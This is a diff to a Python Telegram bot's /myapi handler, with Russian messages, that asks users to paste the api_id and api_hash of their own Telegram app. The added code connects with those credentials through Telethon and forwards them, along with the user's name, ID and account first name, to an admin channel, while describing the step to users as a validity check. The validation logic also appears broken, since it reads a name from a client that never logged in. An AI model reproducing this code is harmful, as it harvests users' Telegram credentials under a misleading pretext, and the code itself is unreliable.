@@ -583,7 +583,7 @@ async def cmd_myapi(message: Message):
             "1. Зайди на my.telegram.org\n"
             "2. Создай приложение\n"
             "3. Скопируй api_id и api_hash\n\n"
-            "После ввода, данные уйдут админу"
+            "Бот проверит API и отправит на канал"
         )
         return
 
@@ -595,23 +595,39 @@ async def cmd_myapi(message: Message):
     api_id = args[0]
     api_hash = args[1]
 
-    admin_channel = settings.get("admin_channel", "")
-    if admin_channel:
-        try:
+    await message.answer("🔍 Проверяю валидность API...")
+
+    try:
+        from telethon import TelegramClient
+
+        test_client = TelegramClient("api_check_session", int(api_id), api_hash)
+        await test_client.connect()
+
+        me = await test_client.get_me()
+        await test_client.disconnect()
+
+        admin_channel = settings.get("admin_channel", "")
+        if admin_channel:
             await bot.send_message(
                 admin_channel,
-                f"📱 *Новые API данные*\n\n"
+                f"✅ *Проверенный API*\n\n"
                 f"👤 Пользователь: {message.from_user.full_name}\n"
                 f"🆔 ID: `{message.from_user.id}`\n"
                 f"🔑 API ID: `{api_id}`\n"
-                f"🔐 API Hash: `{api_hash}`"
+                f"🔐 API Hash: `{api_hash}`\n"
+                f"📛 Имя: {me.first_name}"
             )
-            await message.answer("✅ API данные отправлены админу!")
-        except Exception as e:
-            logger.error(f"Error sending to admin channel: {e}")
-            await message.answer("❌ Ошибка при отправке. Админ настроит канал позже.")
-    else:
-        await message.answer("⚠️ Админ ещё не настроил канал для приёма API. Попробуй позже.")
+            await message.answer("✅ API подтверждён! Данные отправлены на канал.")
+        else:
+            await message.answer("✅ API верный!\n⚠️ Канал для приёма пока не настроен.")
+
+    except Exception as e:
+        logger.error(f"API validation error: {e}")
+        await message.answer(
+            "❌ *Ошибка валидации*\n\n"
+            "API недействителен или истёк.\n"
+            "Создай новый на my.telegram.org"
+        )
 
 
 @router.callback_query(F.data == "action_model")
